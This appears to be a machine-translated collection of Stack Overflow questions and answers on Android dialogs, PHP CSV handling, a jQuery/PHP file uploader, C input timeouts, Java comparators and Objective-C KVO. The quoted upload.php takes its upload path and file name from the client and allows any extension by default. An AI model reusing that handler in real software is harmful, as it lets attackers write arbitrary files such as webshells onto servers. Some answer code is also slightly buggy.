    AlertDialog alertDialog = new AlertDialog.Builder(context).create();

    // Setting Dialog Title
    alertDialog.setTitle(title);

    // Setting Dialog Message
    alertDialog.setMessage(message);

    if(status != null)
        // Setting alert dialog icon
        alertDialog.setIcon((status) ? R.drawable.success : R.drawable.fail); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:45:17.027

你还没有说什么不起作用，但我猜对话框没有出现。

`alertDialog.show()`完成构建后，您需要致电。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:49:07.403

如果没有 LogCat 或类似的东西，很难找出你的错误。您可以看到使用 AlertDialog 的方式：

```
 AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
            context);

        // set title
        alertDialogBuilder.setTitle("Your Title");

        // set dialog message
        alertDialogBuilder
            .setMessage("Click yes to exit!")
            .setCancelable(false)
            .setPositiveButton("Yes",new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog,int id) {
                    // if this button is clicked, close
                    // current activity
                    MainActivity.this.finish();
                }
              })
            .setNegativeButton("No",new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog,int id) {
                    // if this button is clicked, just close
                    // the dialog box and do nothing
                    dialog.cancel();
                }
            });

            // create alert dialog
            AlertDialog alertDialog = alertDialogBuilder.create();

            // show it
            alertDialog.show(); 
```

[此示例说明如何在 Android 中使用 AlertDialog： http](http://www.mkyong.com/android/android-alert-dialog-example/) ://www.mkyong.com/android/android-alert-dialog-example/

# php - PHP CSV，如何从当前行获取前三行和后三行

> ID：13491440
> 
> 赞同：1
> 
> 时间：2012-11-21T10:40:06.287
> 
> 标签：php, csv

我目前在 php 中使用 fgetcsv 来获取 CSV 文件中的行。对于每一行，我需要前 3 行和下 3 行来满足某些要求。

```
while(($data = fgetcsv($handle, 5000, ",")) !== FALSE) {
    //$data is current row data
    //I need previous rows and next rows data
} 
```

我不知道如何尝试，因为每次迭代都会获得当前行的信息。

我们可以在 fgetcsv 循环中实现这一点吗？我也对这个问题的其他替代方案持开放态度。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:47:38.110

将数据添加到数组中，然后使用`for`循环：

```
$myData = array();

while(($data = fgetcsv($handle, 5000, ",")) !== FALSE) {
    $myData[] = $data;
}

for($i=0; $i<count($myData); $i++)
{
    // $myData[$i] is the current row
} 
```

在`for`循环中，您可以添加或减去 from`$i`以获取任何行。所以对于下一行，`$myData[$i+1]`或之后的下一个`$myData[$i+2]`。

前几行也是如此：`$myData[$i-1]`. 请务必在尝试访问之前检查该行是否存在。例如，第一行将没有任何先前的行。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T10:48:06.343

您必须自己存储这些行。

我会做这样的事情：

```
$rows = array();

$index = 0;

while(($data = fgetcsv($handle, 5000, ",")) !== FALSE) {
    $rows[] = $data;

    if($index >= 6) {
        $currentIndex = $index - 4;
        $currentRow = $rows[$currentIndex];
        //Do something with $rows[$currentRowIndex +- 3];    
    }
    $index++;
} 
```

如果数据太大而无法将其全部存储在数组中，您也可以选择最多只存储 7 行，并对第 4 行进行操作：

```
$rows = array();

while(($data = fgetcsv($handle, 5000, ",")) !== FALSE) {
    $rows[] = $data;
    if(count($rows) == 7) {
        $currentRow = $rows[4];
        //Do something with $rows[0-6];
        array_shift($rows);    
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:57:23.977

```
$rows = array();
$index = 0;

while(($data = fgetcsv($handle, 5000, ",")) !== FALSE) {
    $rows[] = $data;
    if($index >= 5) {
        $currIndex = $index - 4;
        $previousIndex = $currIndex - 1;
        $nextIndex = $currIndex + 3;

        if(isset($rows[$nextIndex]) && isset($rows[$previousIndex]))
        {
            $nextRow = $rows[$nextIndex];
            $prevRow = $rows[$previousIndex];
        }
    }
    $index++;
} 
```

# php - Albanx 的 PHP 和 JQuery 上传器 - 空白页

> ID：13491443
> 
> 赞同：1
> 
> 时间：2012-11-21T10:40:11.687
> 
> 标签：php, jquery, upload

我正在尝试实现这个 PHP & JQuery 上传器：[http ://code.google.com/p/ax-jquery-multiuploader/](http://code.google.com/p/ax-jquery-multiuploader/)

我没有更改任何内容，并使用了“表单集成和文件重命名”示例，因为我需要在表单中发送画廊名称来设置文件夹路径。上传工作正常，但一旦完成，我就会得到一个空白页面。我真的不明白为什么...

最奇怪的事情是：每次我尝试修改随包提供的 upload.php 文件以获取消息时，上传似乎不再起作用（进度条停止在大约 25% 处，没有任何事情发生，我留在同一页），但文件已上传。

我想获得一个包含上传图像列表的页面，用标题完成它们，然后在数据库中插入数据（图像路径、名称和标题）。

有谁明白会发生什么？

谢谢，

芦名

编辑：一些帮助... PHPinfo 和 PHP 页面。我试图同时包含 header.php 和 body.php ，因为我必须为我的所有页面做，但正如我解释的那样，它会导致最奇怪的事情。

服务器 PHPinfo：[http ://awichser.dyndns.org/phpinfo.php](http://awichser.dyndns.org/phpinfo.php)

add_gallery.php

```
<!DOCTYPE html>
<html>
    <head>
        <title>As-Wichser.com - Website Management</title>
        <!--- Informations sur le site -->
        <meta name="robots" content="noindex, nofollow" />
        <meta name="author" content="Anne-Sophie Wichser"/>
        <meta name="description" content="Dessin artistique et photographie sportive (automobile et aviation) et de loisirs par Anne-Sophie Wichser."/>
        <meta name="description" content="Drawing and sport (cars and airplanes) and leisure photography by Anne-Sophie Wichser."/>
        <meta name="keywords" content="Anne-Sophie Wichser, anne-sophie wichser, Photos, photo, photos, Photo, Dessin, dessin, Drawing, drawing, 24 Heures du Mans, 24 Hours of Le Mans, Airplanes, airplanes, airplane, Airplane, Avions, avions, Avion, avion, Modélisme, modélisme, Model Kit, model kit, 24, heures, du mans, mans, Mans, 24 heures du mans, 24H,le mans, fia, alms, lmes, lms, autos, course, endurance, séries, series, peugeot 908 hdi fap, porsche, ferrari, audi, lola, courage, viper, saleen, panoz, riley, scott, reynard, lister, storm, wr, dome, bentley, tvr, spyker, lamborghini, maserati, modena, maranello, murcielago, sebring, spa, monza, silverstone, nurburgring, gt, sport, automobile, prototypes, protos, proto, aco, 911, 917, 993, 996, 550, 360, 575, gt2, gt3, gallardo, racing, bugatti, gts-r, daytona, 12 heures, petit le mans, plm, jaguar, aston martin, ford, GT 40, ickx, videos, accidents, vaillant, hunaudieres, mulsanne, arnage, tertre rouge, dunlop,997, gt3-rsr, le mans series, american le mans series, fia-gt, fia-gt3, audi R10,audi R8, corvette, dtm, grand-am, vdev, supergt, jgtc, jlmc, radical, pescarolo, creation, zytek, zultec, michelin, pirelli, oreca, lmp, lmp1, lmp2, le mans prototype, dome, F430, audi r18"/>
        <meta name="publisher" content="Anne-Sophie Wichser"/>
        <meta name="viewport" content="width=device-width; initial-scale=1.0">
        <link href="css/layout.css" rel="stylesheet" type="text/css"/>
        <link href="css/classicTheme/style.css" rel="stylesheet" type="text/css"/>
        <link rel="author" href="mailto:info@swissapco.ch"/>
        <script type="text/javascript" src="http://code.jquery.com/jquery-latest.min.js"></script>
        <script src="js/jquery.js" type="text/javascript"></script>     
        <script src="js/ajaxupload-min.js" type="text/javascript"></script>
        <script src="js/ajaxupload.js" type="text/javascript"></script>
        <script type="text/javascript" src="editeur/ckeditor.js"></script>
    </head>
    <body>
        <div id="container">            
            <div id="horizon">
                <div id="wrapper">
                    <nav>
                        <p class="header">administrateur</p><br /><a class="normal" href="logout.php">Se déconnecter</a><br /><br /><p class="header">news</p><br /><a class="normal" href="add_news.php">Ajouter une news</a><br /><a class="normal" href="list_news.php">Administrer les news</a><br /><br /><p class="header">galeries</p><br /><a class="normal" href="add_gallery.php?gallery=lemans">24 Heures du Mans</a><br /><a class="normal" href="add_gallery.php?gallery=aero">Aviation</a><br /><a class="normal" href="add_gallery.php?gallery=retro">Rétrospective</a><br /><a class="normal" href="add_gallery.php?gallery=para">Parapente</a><br /><a class="normal" href="add_gallery.php?gallery=wild">Nature</a><br /><br /><p class="header">présentation</p><br /><a class="normal" href="list_about.php">Administrer les présentations</a><br /><br />                  </nav>
                    <div id="main">
                        <div id="demo1"></div><form action="upload.php" method="post" id="THEFORM"><fieldset><legend>Gallery selected</legend><input type="text" name="galleryname" value="wild" /><input type="submit" value="Submit" /></fieldset></form>                 </div>                      
                </div>
            </div>
        </div>
        <script>
            CKEDITOR.replace( 'editor1' );
        </script>
        <script>
            var galleryfolder='wild/';
            $('#demo1').ajaxupload({
                url:'upload.php',
                remotePath: '../files/'+galleryfolder,
                editFilename:true,
                form:'#THEFORM'
            });
        </script>
    </body>
</html> 
```

上传.php

```
<?php
    /**
     * PHP Real Ajax Uploader
     * Copyright @Alban Xhaferllari
     * albanx@gmail.com
     * www.albanx.com
     */
    error_reporting(E_ALL ^ E_NOTICE);//remove notice for json invalidation

    $uploadPath = $_REQUEST['ax-file-path'];
    $fileName   = $_REQUEST['ax-file-name'];
    $currByte   = $_REQUEST['ax-start-byte'];
    $maxFileSize= $_REQUEST['ax-maxFileSize'];
    $html5fsize = $_REQUEST['ax-fileSize'];
    $isLast     = $_REQUEST['isLast'];

    //if set generates thumbs only on images type files
    $thumbHeight    = $_REQUEST['ax-thumbHeight'];
    $thumbWidth     = $_REQUEST['ax-thumbWidth'];
    $thumbPostfix   = $_REQUEST['ax-thumbPostfix'];
    $thumbPath      = $_REQUEST['ax-thumbPath'];
    $thumbFormat    = $_REQUEST['ax-thumbFormat'];

    $allowExt   = (empty($_REQUEST['ax-allow-ext']))?array():explode('|', $_REQUEST['ax-allow-ext']);
    $uploadPath .= (!in_array(substr($uploadPath, -1), array('\\','/') ) )?DIRECTORY_SEPARATOR:'';//normalize path

    if(!file_exists($uploadPath) && !empty($uploadPath))
    {
        mkdir($uploadPath, 0777, true);
    }

    if(!file_exists($thumbPath) && !empty($thumbPath))
    {
        mkdir($thumbPath, 0777, true);
    }

    //with gd library

    function createThumbGD($filepath, $thumbPath, $postfix, $maxwidth, $maxheight, $format='jpg', $quality=75)
    {   
        if($maxwidth<=0 && $maxheight<=0)
        {
            return 'No valid width and height given';
        }

        $gd_formats = array('jpg','jpeg','png','gif');//web formats
        $file_name  = pathinfo($filepath);
        if(empty($format)) $format = $file_name['extension'];

        if(!in_array(strtolower($file_name['extension']), $gd_formats))
        {
            return false;
        }

        $thumb_name = $file_name['filename'].$postfix.'.'.$format;

        if(empty($thumbPath))
        {
            $thumbPath=$file_name['dirname'];   
        }
        $thumbPath.= (!in_array(substr($thumbPath, -1), array('\\','/') ) )?DIRECTORY_SEPARATOR:'';//normalize path

        // Get new dimensions
        list($width_orig, $height_orig) = getimagesize($filepath);
        if($width_orig>0 && $height_orig>0)
        {
            $ratioX = $maxwidth/$width_orig;
            $ratioY = $maxheight/$height_orig;
            $ratio  = min($ratioX, $ratioY);
            $ratio  = ($ratio==0)?max($ratioX, $ratioY):$ratio;
            $newW   = $width_orig*$ratio;
            $newH   = $height_orig*$ratio;

            // Resample
            $thumb = imagecreatetruecolor($newW, $newH);
            $image = imagecreatefromstring(file_get_contents($filepath));

            imagecopyresampled($thumb, $image, 0, 0, 0, 0, $newW, $newH, $width_orig, $height_orig);

            // Output
            switch (strtolower($format)) {
                case 'png':
                    imagepng($thumb, $thumbPath.$thumb_name, 9);
                break;

                case 'gif':
                    imagegif($thumb, $thumbPath.$thumb_name);
                break;

                default:
                    imagejpeg($thumb, $thumbPath.$thumb_name, $quality);;
                break;
            }
            imagedestroy($image);
            imagedestroy($thumb);
        }
        else 
        {
            return false;
        }
    }

    //for image magick
    function createThumbIM($filepath, $thumbPath, $postfix, $maxwidth, $maxheight, $format)
    {
        $file_name  = pathinfo($filepath);
        $thumb_name = $file_name['filename'].$postfix.'.'.$format;

        if(empty($thumbPath))
        {
            $thumbPath=$file_name['dirname'];   
        }
        $thumbPath.= (!in_array(substr($thumbPath, -1), array('\\','/') ) )?DIRECTORY_SEPARATOR:'';//normalize path

        $image = new Imagick($filepath);
        $image->thumbnailImage($maxwidth, $maxheight);
        $images->writeImages($thumbPath.$thumb_name);
    }

    function checkFilename($fileName, $size)
    {
        global $allowExt, $uploadPath, $maxFileSize;

        //------------------max file size check from js
        $maxsize_regex = preg_match("/^(?'size'[\\d]+)(?'rang'[a-z]{0,1})$/i", $maxFileSize, $match);
        $maxSize=4*1024*1024;//default 4 M
        if($maxsize_regex && is_numeric($match['size']))
        {
            switch (strtoupper($match['rang']))//1024 or 1000??
            {
                case 'K': $maxSize = $match[1]*1024; break;
                case 'M': $maxSize = $match[1]*1024*1024; break;
                case 'G': $maxSize = $match[1]*1024*1024*1024; break;
                case 'T': $maxSize = $match[1]*1024*1024*1024*1024; break;
                default: $maxSize = $match[1];//default 4 M
            }
        }

        if(!empty($maxFileSize) && $size>$maxSize)
        {
            echo json_encode(array('name'=>$fileName, 'size'=>$size, 'status'=>'error', 'info'=>'File size not allowed.'));
            return false;
        }
        //-----------------End max file size check

        //comment if not using windows web server
        $windowsReserved    = array('CON', 'PRN', 'AUX', 'NUL','COM1', 'COM2', 'COM3', 'COM4', 'COM5', 'COM6', 'COM7', 'COM8', 'COM9',
                                'LPT1', 'LPT2', 'LPT3', 'LPT4', 'LPT5', 'LPT6', 'LPT7', 'LPT8', 'LPT9');    
        $badWinChars        = array_merge(array_map('chr', range(0,31)), array("<", ">", ":", '"', "/", "\\", "|", "?", "*"));

        $fileName   = str_replace($badWinChars, '', $fileName);
        $fileInfo   = pathinfo($fileName);
        $fileExt    = $fileInfo['extension'];
        $fileBase   = $fileInfo['filename'];

        //check if legal windows file name
        if(in_array($fileName, $windowsReserved))
        {
            echo json_encode(array('name'=>$fileName, 'size'=>0, 'status'=>'error', 'info'=>'File name not allowed. Windows reserverd.'));  
            return false;
        }

        //check if is allowed extension
        if(!in_array($fileExt, $allowExt) && count($allowExt))
        {
            echo json_encode(array('name'=>$fileName, 'size'=>0, 'status'=>'error', 'info'=>"Extension [$fileExt] not allowed."));  
            return false;
        }

        $fullPath = $uploadPath.$fileName;
        $c=0;
        while(file_exists($fullPath))
        {
            $c++;
            $fileName   = $fileBase."($c).".$fileExt;
            $fullPath   = $uploadPath.$fileName;
        }
        return $fullPath;
    }

    if(isset($_FILES['ax-files'])) 
    {
        //for each theorically runs only 1 time, since i upload i file per time
        foreach ($_FILES['ax-files']['error'] as $key => $error)
        {
            if ($error == UPLOAD_ERR_OK)
            {
                $newName = !empty($fileName)? $fileName:$_FILES['ax-files']['name'][$key];
                $fullPath = checkFilename($newName, $_FILES['ax-files']['size'][$key]);

                if($fullPath)
                {
                    move_uploaded_file($_FILES['ax-files']['tmp_name'][$key], $fullPath);
                    if(!empty($thumbWidth) || !empty($thumbHeight))
                        createThumbGD($fullPath, $thumbPath, $thumbPostfix, $thumbWidth, $thumbHeight, $thumbFormat);

                    echo json_encode(array('name'=>basename($fullPath), 'size'=>filesize($fullPath), 'status'=>'uploaded', 'info'=>'File uploaded'));
                }
            }
            else
            {
                echo json_encode(array('name'=>basename($_FILES['ax-files']['name'][$key]), 'size'=>$_FILES['ax-files']['size'][$key], 'status'=>'error', 'info'=>$error)); 
            }
        }
    }
    elseif(isset($_REQUEST['ax-file-name'])) 
    {
        //check only the first peice
        $fullPath = ($currByte!=0) ? $uploadPath.$fileName:checkFilename($fileName, $html5fsize);

        if($fullPath)
        {
            $flag           = ($currByte==0) ? 0:FILE_APPEND;
            $receivedBytes  = file_get_contents('php://input');
            //strange bug on very fast connections like localhost, some times cant write on file
            //TODO future version save parts on different files and then make join of parts
            while(@file_put_contents($fullPath, $receivedBytes, $flag) === false)
            {
                usleep(50);
            }

            if($isLast==true)
            {
                createThumbGD($fullPath, $thumbPath, $thumbPostfix, $thumbWidth, $thumbHeight, $thumbFormat);
            }
            echo json_encode(array('name'=>basename($fullPath), 'size'=>$currByte, 'status'=>'uploaded', 'info'=>'File/chunk uploaded'));
        }
    }

    //var_dump($_POST);
?> 
```

# c - 如果没有输入，则在一定时间后退出循环

> ID：13491444
> 
> 赞同：5
> 
> 时间：2012-11-21T10:40:22.800
> 
> 标签：c

我只是想知道这是否可能以及如何实现此功能，如果没有用户输入，我们将退出循环。例如，如果用户在 1 分钟后没有输入任何内容，我想退出循环。这是我的 C 代码：

```
#include <stdio.h>
#include <conio.h>
#include <time.h>

int main(void)
{
    int x;
    time_t end = time(0) + 60;
    printf("Enter a number : ");

    while (time(0) < end)
    {
        if((scanf("%d", &x)) != EOF || (getchar() != '\n'))
        {
            time_t end2 = time(0) + 60;
            while(time(0) < end2);
            main();
        }
        else
        {
            printf("%d", x);
            main();
        }
    }
    main();
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:28:28.703

使用`select()`函数为您的 scanf 设置超时

以下代码是如何使用它的示例。

```
#include <stdlib.h>
#include <stdio.h>
#include <sys/time.h>

int main(void)
{
    int x;
    fd_set          set;
    struct          timeval timeout = {0};

    FD_ZERO(&set);

   while(1)
   {
        timeout.tv_sec = 30;
        FD_SET(fileno( stdin ), &set);
        printf ("enter a number:");
        fflush (stdout);
        if (select(FD_SETSIZE, &set, NULL, NULL, &timeout))
        {

           scanf("%d", &x);
           printf("The number you put is %d\r\n",x);

        }
        else
        {
                printf("\r\nTimeout: Stop reading\r\n");
                break;
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:53:14.140

虽然 time() 返回的 time_t 结构很可能是秒数，但您不应该对其进行数学运算。而是使用 difftime()

```
double difftime ( time_t time2, time_t time1 ); 
```

计算 time1 和 time2 之间的秒差。

你不需要`main()`从内部打电话，`main()`我不知道你为什么会认为这是个好主意。

此外，`getchar()`将等待一个键被按下，所以它不会在后台计算时间。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T11:02:52.323

此任务通常使用线程完成。在一个线程`getchar`被调用阻止线程执行时，另一个线程执行`sleep()`然后杀死第一个线程。

`read()`另一种方法是使用标准输入使用非阻塞`pselect (2)`，但它更棘手并且不适合小型应用程序。

尽管 unix 风格的解决方案`pthreads`非常冗长：

```
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>

struct read_int {
    int success;
    int value;
    struct timespec timeout;
};

void* read_thread(void *arg) {
    struct read_int *s = arg;
    printf("Enter a number: ");
    scanf("%d", &s->value);
    s->success = 1;
    return NULL;
}

#define CHECK_RET(ret, func) \
    if (ret) { fprintf(stderr, func"() == %d\n", ret); return ret; }

int main() {
    pthread_t rthr;
    pthread_attr_t thr_attr;

    struct read_int s = { 0 };
    int ret;

    ret = clock_gettime(CLOCK_REALTIME, &s.timeout);
    if (ret == -1) { fprintf(stderr, "clock_gettime() == %d\n", ret);  return ret; }

    s.timeout.tv_sec += 5;

    ret = pthread_attr_init(&thr_attr);
    CHECK_RET(ret, "pthread_attr_init");

    ret = pthread_create(&rthr, &thr_attr, read_thread, &s);
    CHECK_RET(ret, "pthread_create");

    ret = pthread_attr_destroy(&thr_attr);
    CHECK_RET(ret, "pthread_attr_destroy");

    pthread_timedjoin_np(rthr, NULL, &s.timeout);

    if (s.success) {
        printf("\ngot value %d\n", s.value);
    } else {
        pthread_cancel(rthr);
        printf("\nTimed out, exiting...\n\n");
    }
} 
```

# .net - Windows 7 上的 Visual Studio 2003 先决条件

> ID：13491446
> 
> 赞同：1
> 
> 时间：2012-11-21T10:40:24.513
> 
> 标签：.net, visual-studio, iis, iis-7, .net-1.1

我正在尝试安装`Visual Studio 2003`在`Windows 7`. 我们这里有一个用 VS2003 编写的 Web 应用程序，我需要支持它。

安装开始时，它会进行先决条件检查并告诉我需要：

*   要安装的 IIS 和
*   Frontpage 服务器扩展

我知道 IIS 已安装。但是为什么它会要求我安装它呢？我在这里错过了什么吗？

Frontpage 服务器扩展又如何呢？我只是忽略这个吗？如果不是，我从哪里得到这个？

当我进入程序和功能选择打开和关闭 widowns 功能时，我选择了以下选项：

Internet 信息服务 -> Web 管理工具 -> IIS6 管理兼容性：

*   IIS 6 管理控制台
*   IIS 6 脚本工具
*   IIS 6 WMI 兼容性
*   IIS 元数据库和 IIS 6 配置兼容性

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:46:59.050

可能 VS 正在尝试检测 IIS 6.0，Windows 7 附带 IIS 7 / 7.5，如果您想为经典 ASP 配置 IIS 7，请查看： http: [//www.codeproject.com/Articles/43132/How-to-Setup -IIS-6-0-on-Windows-7-to-Allow-Classic](http://www.codeproject.com/Articles/43132/How-to-Setup-IIS-6-0-on-Windows-7-to-Allow-Classic)但是请查看有关安装 IIS 6 的讨论：[Is it possible to install IIS 6 on a windows 7 machine?](https://stackoverflow.com/questions/9689393/is-it-possible-to-install-iis-6-on-a-windows-7-machine)

不要尝试在 IIs 7 上安装首页扩展，看看这篇文章：[http ://forums.iis.net/p/1160144/1913961.aspx](http://forums.iis.net/p/1160144/1913961.aspx)

希望能帮助到你，

# java - Java 对用户定义的对象进行排序

> ID：13491450
> 
> 赞同：2
> 
> 时间：2012-11-21T10:40:39.890
> 
> 标签：java

我想对不实现可比较或比较接口的对象集合进行排序。问题是我无法更改类设计，因为我只有 .class（无源代码）文件。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T10:42:24.070

您可以通过提供自定义[Comparator](http://docs.oracle.com/javase/6/docs/api/java/util/Comparator.html)进行排序。您不需要实现[Comparable](http://docs.oracle.com/javase/6/docs/api/java/lang/Comparable.html)。

请参阅[Collections.sort(List s, Comparator c)](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/Collections.html#sort%28java.util.List,%20java.util.Comparator%29)和[Collections ordering tutorial](http://docs.oracle.com/javase/tutorial/collections/interfaces/order.html) - 特别是标有*Comparators*的部分：

> 如果您想以不同于自然顺序的顺序对某些对象进行排序怎么办？或者如果你想对一些没有实现 Comparable 的对象进行排序呢？

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-21T10:44:27.607

您可以使用比较器

```
public class ExampleComparator {
public static void main(String[] args) {

    List<Person> list = new ArrayList<Person>();
    list.add(new Person("shyam",24));
    list.add(new Person("jk",29));
    list.add(new Person("paul",30));
    list.add(new Person("ashique",4));
    list.add(new Person("sreeraj",14));
    for (Person person : list) {
        System.out.println(person.getName()+ "   "+ person.getAge());
    }
    Collections.sort(list,new PersonComparator());
    System.out.println("After sorting");
    for (Person person : list) {
        System.out.println(person.getName()+ "   "+ person.getAge());
    }
}
}

public class Person {
private int age;
private String name;

Person (String name, int age){
    setName(name);
    setAge(age);
}

public int getAge() {
    return age;
}

public void setAge(int age) {
    this.age = age;
}

public String getName() {
    return name;
}

public void setName(String name) {
    this.name = name;
}
}

public class PersonComparator implements Comparator<Person> {

@Override
public int compare(Person obj1, Person obj2) {
    return obj1.getAge() - obj2.getAge();
}
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-21T10:56:46.697

假设您需要对`Person`对象列表进行排序：

```
public class Person {

    private String name;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }
} 
```

它不必实现**Comparable**或**Comparator**接口。你可以这样排序：

```
public void someTest() {
    LinkedList<Person> persons = new LinkedList<Person>();
    persons.add(new Person());
    //add as many as you want
    Collections.sort(persons, new Comparator<Person>() {
        @Override
        public int compare(Person o1, Person o2) {
            return o1.getName().compareTo(o2.getName());
        }
    });
} 
```

看看[这里](https://stackoverflow.com/questions/13014952/best-way-to-sort-2-array-lists/13015087#13015087)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-21T10:44:20.977

**-**您的类不需要实现`Comparable`，而是**自定义**java.util.Comparator。

**-**原因`Comparator`就像**比较要比较对象的类之外的对象。**

**-**您将需要使用该`Collections's`方法`sort()`。

**例如：**

`Collections.sort(List l , Comparator c)`

**-当我们想根据一个对象的** **多个属性对**`Comparator`对象进行排序时，它也非常有用。

 *** * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-21T10:47:50.653

假设您的课程看起来更像这样：

```
class Test {
    public int amount; //field u want to compare

    // ...

} 
```

为此类编写自定义比较器：

```
class TestAmountComparator implements Comparator<Test> {
    @Override
    public int compare(Test t1, Test t2) {
        return Integer.valueOf(t1.amount).compareTo(Integer.valueOf(t2.amount))          
    }
} 
```

要对对象列表进行排序：

```
List<Test> list = new ArrayList<Test>(myTest); //your Test list
//sorting
Collections.sort(list, new TestAmountComparator()); //sort by amount 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-11-21T10:50:55.910

可以使用自定义对集合进行排序 `Comparator` （例如：如果您有一个班级呼叫`Person`并且想要根据人的年龄进行排序）

```
public class CustomComparator implements Comparator<Person>{

    @Override
    public int compare(Person o1, Person o2) {
        if (o1.getAge() < o2.getAge()){
            return 1;
        }else{
            return 0;
        }
    }
} 
```

然后您可以使用此自定义比较器对人员列表进行排序

```
Collections.sort(list, new CustomComparator()); 
```**

# orbeon - 在重复部分使列不可见

> ID：13491451
> 
> 赞同：1
> 
> 时间：2012-11-21T10:40:45.897
> 
> 标签：orbeon, xforms

在重复部分很容易制作不可见的行。但是我们需要使重复的第一列不可见。我们怎样才能做到？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T06:31:28.160

假设每行包含 4 列，其中包含以下信息，

```
DOJ EmpId   EmpName Department 
```

节点看起来像这样

```
<employee>
<doj/>
<emp-id/>
<emp-name/>
<department/>
</employee> 
```

那么 xforms:repeat 内容将如下所示

```
<xforms:repeat nodeset="instance('main-instance')/employees/employee" id="employee-repeat" >
<tr>
<xforms:group ref=".[your condition]">
<td>
    <xforms:output ref="doj" />
</td>
</xforms:group>
<td>
    <xforms:output ref="emp-id" />              
</td>
<td>
    <xforms:output ref="emp-name" />                
</td>
<td>
    <xforms:output ref="department" />              
</td>
</tr>
</xforms:repeat> 
```

现在，由于您不想在所有行上显示第一列（在本例中为 doj），只需删除`<td>`重复内容中的第一列。

**更新：**

基于 OP Comment，是的，我们可以隐藏和显示，而不是使用`<xforms:group>`标签删除代码。修改了上面的代码以反映这一点。

# objective-c - Key Value Observing - 如何观察一个对象的所有属性？

> ID：13491454
> 
> 赞同：17
> 
> 时间：2012-11-21T10:40:49.583
> 
> 标签：objective-c, key-value-observing

我对使用键值观察 (KVO) 以及如何注册以接收属性更改通知感到满意：

```
[account addObserver:inspector
          forKeyPath:@"openingBalance"
             options:NSKeyValueObservingOptionNew
              context:NULL]; 
```

但是，如果我想观察帐户对象的所有属性的变化，我该如何实现呢？我必须为每处房产登记通知吗？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-11-21T11:29:55.127

似乎没有内置函数可以订阅对象所有属性的更改。

如果您不关心确切的属性已更改并且可以更改您的类，则可以向其添加虚拟属性以观察其他属性的更改（使用`+ keyPathsForValuesAffectingValueForKey`或`+keyPathsForValuesAffecting<Key>`方法）：

```
// .h. We don't care about the value of this property, it will be used only for KVO forwarding
@property (nonatomic) int dummy;

#import <objc/runtime.h>
//.m
+ (NSSet*) keyPathsForValuesAffectingDummy{

    NSMutableSet *result = [NSMutableSet set];

    unsigned int count;
    objc_property_t *props = class_copyPropertyList([self class], &count);

    for (int i = 0; i < count; ++i){
        const char *propName = property_getName(props[i]);
        // Make sure "dummy" property does not affect itself
        if (strcmp(propName, "dummy"))
            [result addObject:[NSString stringWithUTF8String:propName]];
    }

    free(props);
    return result;
} 
```

现在，如果您观察`dummy`属性，每次更改任何对象的属性时都会收到 KVO 通知。

您还可以像发布的代码一样获取对象中所有属性的列表，并在循环中为每个属性订阅 KVO 通知（因此您不必对属性值进行硬编码） - 这样您将获得更改的属性如果需要，请命名。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2020-01-21T10:49:46.643

正如 david van brink 所建议的，以下 Swift 代码为每个属性添加了观察结果。它有一个额外的功能来删除观察（例如 in `deinit`）：

```
extension NSObject {
    func addObserverForAllProperties(
        observer: NSObject,
        options: NSKeyValueObservingOptions = [],
        context: UnsafeMutableRawPointer? = nil
    ) {
        performForAllKeyPaths { keyPath in
            addObserver(observer, forKeyPath: keyPath, options: options, context: context)
        }
    }

    func removeObserverForAllProperties(
        observer: NSObject,
        context: UnsafeMutableRawPointer? = nil
    ) {
        performForAllKeyPaths { keyPath in
            removeObserver(observer, forKeyPath: keyPath, context: context)
        }
    }

    func performForAllKeyPaths(_ action: (String) -> Void) {
        var count: UInt32 = 0
        guard let properties = class_copyPropertyList(object_getClass(self), &count) else { return }
        defer { free(properties) }
        for i in 0 ..< Int(count) {
            let keyPath = String(cString: property_getName(properties[i]))
            action(keyPath)
        }
    }
} 
```

# java - 具有多个布尔值的 AtomicMarkableReference

> ID：13491462
> 
> 赞同：1
> 
> 时间：2012-11-21T10:41:20.807
> 
> 标签：java, data-structures, concurrency, atomic

我希望在 Java 中找到一个类，它允许我用 3 个标记位而不是一个来实现一个原子对象。如果我只需要 1 个标记位，AtomicMarkableReference 就可以达到目的，但是有没有办法用 3 个标记位而不是 1 来实现原子引用，或者是否有任何类可以做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:51:35.877

我怀疑您想要[AtomicStampedReference](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/atomic/AtomicStampedReference.html)，每个引用最多存储 32 位

# jquery - 滚动到的 Chrome 问题

> ID：13491476
> 
> 赞同：1
> 
> 时间：2012-11-21T10:41:57.470
> 
> 标签：jquery, google-chrome, scrollto

您好有两个导航箭头 Prev 和 Next 的导航菜单。这适用于除 Chrome 之外的所有浏览器（Firefox、IE、Opera、Safari）。按下按钮时甚至不会收到错误消息。

有人可以看看按钮的代码。我错过了什么吗？

谢谢！

```
function scroll(direction) {        
    var scroll, i, positions = [], here = $(window).scrollTop(), collection = $('.box'), duration = 750, easing = "easeOutExpo";

    collection.each(function() {
